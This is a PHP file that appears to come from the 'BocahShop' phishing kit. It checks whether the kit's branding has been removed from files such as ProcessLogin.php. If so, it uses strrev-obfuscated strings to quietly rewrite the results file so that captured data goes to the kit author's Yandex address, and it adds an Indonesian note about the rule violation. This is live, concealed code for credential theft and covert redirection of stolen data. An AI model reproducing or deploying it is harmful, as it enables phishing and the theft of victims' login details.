<?php
error_reporting(0);
$d = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/Done.php");
$p = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/bocahshop.php");
$c = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/tytyd.php");
$l = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/bocah/includes/ProcessLogin.php");
$e = strrev("hacoblepa");
$y = strrev("xednay");
$t = strrev("moc");
$ty = strrev("dytyt");
$de = strrev("liame ruoy teS");
$el = strrev("liamE");
$n  = strrev("TLUSER ADAP POHSHACOB LEBAL HABUGNEM >- SELUR RAGGNALEM ANRAK ITNAGRET SITAMOTO");

if(!preg_match("/\[B\]OCA\[H\]SHO\[P\]/is", $p) OR !preg_match("/\[B\]OCA\[H\]SHO\[P\]/is", $d) || !preg_match("/\[B\]OCA\[H\]SHO\[P\]/is", $l) || !preg_match("/\[B\]oca\[H\]sho\[P\]/", $p) || !preg_match("/\[B\]OCA\[H\]SHO\[P\]/is", $c))
{
    $em = preg_match_all("/Your_$el = \"(.*)\"; \/\/ $de/is", $c, $eme);
    $ne = $eme[1][0];
    $c = str_replace($ne,"$e@$y.$t",$c);
    $c = str_replace("NotipBocah","EMAIL $n!!~", $c);
    $buka = @fopen($_SERVER['DOCUMENT_ROOT']."/$ty.php",'w');
    @fwrite($buka,$c);
    @fclose($buka);
}
?>